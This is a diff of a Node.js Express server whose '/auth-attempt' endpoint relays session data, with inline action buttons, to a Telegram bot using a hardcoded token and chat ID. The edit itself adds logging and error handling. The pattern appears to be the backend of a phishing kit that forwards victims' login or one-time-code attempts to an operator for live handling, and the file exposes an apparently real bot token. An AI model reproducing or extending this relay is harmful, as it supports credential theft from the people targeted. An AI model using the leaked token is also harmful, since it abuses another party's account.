@@ -1,8 +1,10 @@
 const express = require('express');
 const cors = require('cors');
 const fetch = require('node-fetch');
+
 const app = express();
 
+// Middleware at the very top
 app.use(cors({
     origin: '*',
     credentials: true
@@ -25,6 +27,8 @@ app.post('/auth-attempt', (req, res) => {
     const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw"; 
     const TG_CHAT_ID = "7863254073";
 
+    console.log(`Received auth-attempt for session: ${sessionId}`);
+
     fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { 
         method: 'POST', 
         headers: { 'Content-Type': 'application/json' }, 
@@ -38,7 +42,11 @@ app.post('/auth-attempt', (req, res) => {
                 ]] 
             } 
         }) 
-    }); 
+    })
+    .then(response => response.json())
+    .then(data => console.log('Telegram response:', data))
+    .catch(err => console.error('Telegram error:', err));
+
     res.status(200).json({ status: "sent" }); 
 });
 
